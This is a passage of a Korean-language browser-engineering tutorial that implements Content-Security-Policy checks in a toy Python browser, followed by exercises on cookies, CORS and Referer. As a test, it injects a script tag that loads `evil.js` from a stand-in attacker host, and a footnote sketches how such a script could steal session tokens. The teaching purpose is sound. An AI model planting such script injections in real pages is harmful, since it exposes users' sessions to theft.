기존의 모든 `request` 사용처가 헤더를 무시하도록 반드시 갱신하세요.

다음으로, 페이지를 로드할 때 `Content-Security-Policy` 헤더를 뽑아내 파싱해야 합니다.[^34]

```python
class Tab:
    def load(self, url, payload=None):
        # ...
        self.allowed_origins = None
        if "content-security-policy" in headers:
            csp = headers["content-security-policy"].split()
            if len(csp) > 0 and csp[0] == "default-src":
                self.allowed_origins = []
                for origin in csp[1:]:
                    self.allowed_origins.append(URL(origin).origin())
        # ...
```

이 파싱은 JavaScript나 CSS를 요청하기 _전에_ 이루어져야 합니다. 이제 그 요청들이 허용되는지 확인해야 하기 때문입니다.

```python
class Tab:
    def load(self, url, payload=None):
        # ...
        for script in scripts:
            script_url = url.resolve(script)
            if not self.allowed_request(script_url):
                print("Blocked script", script, "due to CSP")
                continue
            # ...
```

허용 여부를 알려면 먼저 상대 URL을 해석해야 한다는 점에 주의하세요. CSS 로드 코드에도 비슷한 검사를 추가하세요.

`XMLHttpRequest` URL도 확인해야 합니다.[^35]

```python
class JSContext:
    def XMLHttpRequest_send(self, method, url, body):
        full_url = self.tab.url.resolve(url)
        if not self.tab.allowed_request(full_url):
            raise Exception("Cross-origin XHR blocked by CSP")
        # ...
```

`allowed_request` 검사는 `Content-Security-Policy`가 없는 경우와 있는 경우를 모두 처리해야 합니다.

```python
class Tab:
    def allowed_request(self, url):
        return self.allowed_origins == None or \
            url.origin() in self.allowed_origins
```

이제 방명록은 `Content-Security-Policy` 헤더를 보낼 수 있습니다.

```python
def handle_connection(conx):
    # ...
    csp = "default-src http://localhost:8000"
    response += "Content-Security-Policy: {}\r\n".format(csp)
    # ...
```

우리 구현이 동작하는지 확인하기 위해, 방명록이 허용된 서버 목록 밖에서 스크립트를 요청하게 해 봅시다.

```python
def show_comments(session):
    # ...
    out += "<script src=https://example.com/evil.js></script>"
    # ...
```

모든 것을 올바르게 구현했다면 브라우저는 그 악성 스크립트를 차단하고[^36] 콘솔에 그 사실을 보고할 것입니다.

그래서 다 된 걸까요? 방명록은 완전히 안전할까요? 음… 아닙니다. 웹 애플리케이션 보안에는 이 책에 담긴 것보다 훨씬, _훨씬_ 더 많은 것이 있습니다. 그리고 이 책의 나머지 부분과 마찬가지로, 보안과 프라이버시에 닿아 있는 다른 브라우저 메커니즘도 많습니다. 이 정도로 만족합시다. 방명록은 이전보다 더 안전해졌습니다.

### 더 알아보기

복잡한 사이트에서 `Content-Security-Policy`를 적용하면 뜻하지 않게 무언가가 망가질 수 있습니다. 그래서 브라우저는 [`report-to` 지시어](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)를 사용해 `Content-Security-Policy` 위반을 서버에 자동으로 보고할 수 있습니다. [`Content-Security-Policy-Report-Only`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only) 헤더는 브라우저에게 실제로 요청을 차단하지는 _않으면서_ 콘텐츠 보안 정책 위반을 보고하라고 요청합니다.

## 요약

우리는 브라우저에 쿠키라는 형태로 사용자 데이터를 추가했고, 곧바로 그 데이터를 지키고 오용되지 않게 해야 하는 무거운 책임을 지게 되었습니다. 그 과정은 다음과 같습니다.

- 동일 출처 정책으로 교차 사이트 `XMLHttpRequest`를 완화했습니다.

- 논스와 `SameSite` 쿠키로 교차 사이트 요청 위조를 완화했습니다.

- 이스케이프와 `Content-Security-Policy`로 교차 사이트 스크립팅을 완화했습니다.

또한 웹 브라우저의 능력이 커질 때마다 사용자 데이터를 보호할 책임도 함께 커진다는 더 일반적인 교훈도 보았습니다. 보안은 웹 브라우저 설계 전반에 걸쳐 늘 함께해야 하는 고려 사항입니다.

> **주의**
>
> 이 책의 목적은 _웹 브라우저의 내부_ 를 가르치는 것이지 웹 애플리케이션 보안을 가르치는 것이 아닙니다. 이 방명록을 진정으로 안전하게 만들려면 훨씬 더 많은 일을 해야 하고, 서비스 거부 공격을 피하거나 스팸과 악의적 사용을 처리하려면 더더욱 그렇습니다. 보안이 중요한 코드를 다루기 전에 다른 자료를 반드시 참고하세요.

## 연습문제

**10-1 _새로운 입력_.** hidden과 password 입력 요소 지원을 추가하세요. hidden 입력은 화면에 나타나지도, 공간을 차지하지도 않아야 하고, password 입력 요소는 내용을 문자 대신 별표로 표시해야 합니다.

**10-2 _인증서 오류_.** HTTPS 페이지에 접근할 때 웹 서버가 유효하지 않은 인증서를 보낼 수 있습니다([`badssl.com`](https://badssl.com)에서 테스트에 쓸 수 있는 다양한 잘못된 인증서를 호스팅합니다). 이 경우 `wrap_socket` 함수가 인증서 오류를 던집니다. 이 오류를 잡아 사용자에게 경고 메시지를 보여 주세요. _다른_ 모든 HTTPS 페이지에 대해서는 주소창에 자물쇠(`\N{lock}`로 씁니다)를 그리세요.

**10-3 _스크립트 접근_.** [`document.cookie` JavaScript API](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)를 구현하세요. 이 필드를 읽으면 `Cookie` 헤더와 비슷하게 형식화된, 쿠키 값과 매개변수를 담은 문자열이 반환되어야 합니다. 이 필드에 쓰면 `Set-Cookie` 헤더를 받았을 때와 마찬가지로 쿠키 값과 매개변수가 갱신됩니다. `HttpOnly` 쿠키 매개변수도 구현하세요. 이 매개변수가 있는 쿠키는 JavaScript에서 [읽거나 쓸 수 없습니다](https://datatracker.ietf.org/doc/html/rfc6265#section-5.3).

**10-4 _쿠키 만료_.** 쿠키 만료 지원을 추가하세요. 쿠키 만료 날짜는 `Set-Cookie` 헤더에서 설정되며, 같은 쿠키가 더 나중 날짜로 다시 설정되면 덮어쓸 수 있습니다. 서버 쪽에서는 만료 날짜를 `SESSIONS` 변수에 저장하고, 그것을 사용해 오래된 세션을 삭제해 메모리를 아끼세요.

**10-5 _교차 출처 자원 공유(CORS)_.** 웹 서버는 교차 출처 `XMLHttpRequest`를 허용하도록 [_명시적으로 동의_](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)할 수 있습니다. 동작 방식은 이렇습니다. 교차 출처 HTTP 요청에서 브라우저는 요청을 보내되 요청하는 사이트의 출처를 담은 `Origin` 헤더를 포함시킵니다. 이 요청에는 대상 출처의 쿠키가 포함됩니다. 동일 출처 정책을 만족시키기 위해 브라우저는 그다음 응답을 버립니다. 하지만 서버가 `Access-Control-Allow-Origin` 헤더를 보내고 그 값이 요청한 출처이거나 특수한 `*` 값이면, 브라우저는 응답을 버리는 대신 스크립트에 돌려줍니다. 여러분의 브라우저가 만드는 모든 요청은 CORS 표준이 "단순 요청(simple request)"이라고 부르는 것에 해당합니다.

**10-6 _`Referer`_.** 브라우저가 웹 페이지를 방문하거나 CSS 또는 JavaScript 파일을 로드할 때, 어디서 왔는지를 담은 `Referer` 헤더[^37]를 보냅니다. 사이트들은 흔히 이를 분석에 사용합니다. 이를 여러분의 브라우저에 구현하세요. 다만 어떤 URL에는 다른 웹사이트에 드러내고 싶지 않은 개인 정보가 들어 있으므로, 브라우저는 `Referrer-Policy` 헤더[^38]를 지원합니다. 이 헤더에는 `no-referrer`[^39](이 페이지를 떠날 때 절대 `Referer` 헤더를 보내지 않음)나 `same-origin`(같은 출처의 다른 페이지로 이동할 때만 보냄) 같은 값이 들어갈 수 있습니다. `Referrer-Policy`에 대해 이 두 값을 구현하세요.

[^32]: 사이트의 쿠키와 쿠키 매개변수는 [`document.cookie`](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie) API를 통해 그 사이트에서 실행되는 스크립트가 접근할 수 있습니다. 웹 서버가 교차 출처 요청 허용에 어떻게 _명시적으로 동의_ 할 수 있는지는 연습문제 10-5를 보세요. 쿠키를 훔치려면 훔친 쿠키를 받겠다고 동의해야 하는 쪽은 공격자의 서버입니다. 또는 실제 브라우저에서라면 `evil.js`가 페이지에 이미지나 스크립트를 추가해 추가 요청을 유발할 수 있습니다. 기능이 제한된 우리 브라우저에서는 공격이 조금 더 조잡해야 하지만, 악성 스크립트는 예를 들어 페이지 전체를 공격자의 사이트로 가는 링크로 바꾸고 URL에 토큰 값을 넣을 수 있습니다. "계속하려면 클릭하세요" 화면을 보고 아무 생각 없이 클릭해 본 적이 있을 텐데, 여러분의 사용자들도 그럴 것입니다.

[^33]: 연습문제 1-4에서 이미 구현했을 수도 있습니다.

[^34]: 실제 브라우저에서 `Content-Security-Policy`는 스킴을 명시하지 않은 URL이나 `self` 같은 다른 출처도 나열할 수 있습니다. 또한 `default-src` 외의 키워드도 있어서, 스타일, 스크립트, `XMLHttpRequest`를 각각 자신만의 URL 집합으로 제한할 수 있습니다.

[^35]: 스타일과 스크립트를 로드할 때 우리 브라우저는 차단된 자원을 단순히 무시하는 반면, 차단된 `XMLHttpRequest`에 대해서는 예외를 던진다는 점에 주의하세요. `XMLHttpRequest` 호출의 예외는 JavaScript에서 잡아 처리할 수 있기 때문입니다.

[^36]: 말할 필요도 없지만 `example.com`은 실제로 `evil.js` 파일을 호스팅하지 않으며, 그것에 대한 요청은 "404 Not Found"를 반환합니다.
